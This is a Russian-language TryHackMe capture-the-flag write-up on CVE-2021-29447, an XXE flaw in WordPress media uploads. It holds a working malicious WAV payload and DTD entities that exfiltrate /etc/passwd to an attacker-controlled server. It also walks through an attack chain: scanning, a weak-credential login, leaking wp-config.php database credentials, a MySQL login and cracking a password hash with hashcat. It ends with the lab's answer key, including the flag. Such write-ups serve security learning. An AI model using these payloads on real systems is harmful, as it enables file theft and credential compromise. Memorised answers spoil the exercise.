[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Wordpress: CVE-2021-29447](https://tryhackme.com/r/room/wordpresscve202129447) 

Всего 2 задания:
## Задание 1
Уязвимость XXE состоит из инъекции, которая использует плохую конфигурацию интерпретатора XML. Это позволяет нам 
включать внешние сущности, позволяя нам атаковать приложения, которые интерпретируют язык XML в своих параметрах. Мы 
рассмотрим недавнюю уязвимость XXE , хотя и с некоторыми ситуативными оговорками.  

Исследователи из компании по безопасности SonarSource обнаружили уязвимость XML external entity injection (XXE) в 
медиабиблиотеке WordPress. Уязвимость может быть использована только в том случае, если эта CMS работает на PHP 8 и 
у атакующего пользователя есть разрешения на загрузку медиафайлов. Обратите внимание на последнее условие, когда мы 
рассмотрим пример использования этой уязвимости ниже.

#### Влияние
Произвольное раскрытие файлов : содержимое любого файла в файловой системе хоста может быть извлечено, например,  
wp-config.php  , который содержит конфиденциальные данные, такие как учетные данные базы данных.  
Подделка запросов на стороне сервера ( SSRF ) : HTTP- запросы могут быть сделаны от имени установки WordPress. В 
зависимости от среды это может иметь серьезные последствия.  


#### Использование уязвимости

Сайт WordPress, затронутый этой уязвимостью, был идентифицирован с помощью инструмента WPScan. Ниже мы можем увидеть 
вывод этого инструмента из нашего перечисления.  

В этом примере мы определили, что пользователь-автор использует слабые учетные данные.

user: test-corp
password: test

В этом случае мы видим, что у этого пользователя есть разрешение на загрузку медиафайлов. Мы можем использовать это 
для загрузки обратного шелла! 

Создание вредоносного WAV-файла.

Это очень просто, в консоли bash введите следующую команду:
```commandline
nano poc.wav
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

На вашей атакующей машине (вероятно, Kali или TryHackMe AttackBox) создайте файл dtd со следующим кодом. Это позволит нам выполнить код после того, как веб-сервер извлечет файл dtd. Убедитесь, что имя этого файла совпадает с тем, что вы ввели в файл .wav для NAMEEVIL.dtd (см. предыдущую аннотацию к коду).
```commandline
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```
Теперь запустите http-сервер в том же каталоге, что и файл dtd.

`php -S 0.0.0.0:PORT`

Теперь загрузите вредоносный .wav в приложение WordPress!

После загрузки файла .wav вы должны увидеть следующий запрос в журналах HTTP-сервера. Обратите внимание, что для 
эффективной эксфильтрации данных мы использовали Zlib для кодирования.  

Для практики (и ради примера) давайте используем PHP для декодирования этой рекламной статьи! Создайте .php со 
следующим кодом, просто не забудьте скопировать и вставить base64, возвращенный сервером WordPress, где у нас есть 
'base64here' в коде примера.

`<?php echo zlib_decode(base64_decode('base64here')); ?>`

Запустите php-файл с помощью следующей команды: php FILENAME.php

Аналогичным образом мы также можем использовать другие библиотеки кодирования base64, например следующие:
```commandline
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Расшифровать это отсюда проще простого! Мы можем скопировать полученный base64-текст обратно в консоль для 
расшифровки с помощью следующей команды:
`echo "base64here" | base64 -d`
Переходите к следующему заданию и попробуйте сами!

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 2
Пожалуйста, помогите нам взломать систему, используя информацию, предоставленную во вводном задании.

Сможете ли вы выполнить задание?
### Ответьте на вопросы ниже

Используйте уязвимость CVE-2021-29447 для чтения файла конфигурации WordPress.
```commandline
nmap -sC -sV <IP>
# http://<IP>/wp-login.php
test-corp:test
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOUR_IP:YOUR_PORT/EVILFILE.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
python3 -m http.server 4444
echo "?p=hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzLoawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RDiSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X" | base64 -d
# wp-config.php
define( 'DB_NAME', 'wordpressdb2' );
define( 'DB_USER', 'thedarktangent' );
define( 'DB_PASSWORD', 'sUp3rS3cret132' );

mysql -h <IP> -u thedarktangent -p
use wordpressdb2;
select * from wptry_users\G;
hashcat -a 0 -m 400 hash /usr/share/wordlists/rockyou.txt -O
corp-001:teddybear
```
```commandline
Ответ не нужен
```
Исходя из результатов пункта 1, как называется база данных для WordPress?
```commandline
wordpressdb2
```
Основываясь на результатах пункта 1, какие учетные данные вы обнаружили?
пример: пользователь:пароль
```commandline
thedarktangent:sUp3rS3cret132
```
Перечислите и определите, какие СУБД установлены на сервере?
```commandline
mysql
```
Исходя из результатов пункта 4,  какая  версия СУБД  установлена на сервере?
```commandline
5.7.33
```
Исходя из результатов пункта 4,  на каком порту  работает СУБД  ?
```commandline
3306
```
Скомпрометируйте  СУБД. Какой зашифрованный пароль находится в таблице пользователей WordPress с идентификатором 1?
```commandline
$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1
```
Исходя из результатов пункта 7, каков пароль в открытом тексте?
```commandline
teddybear
```
Взломайте машину и найдите flag.txt
```commandline
thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)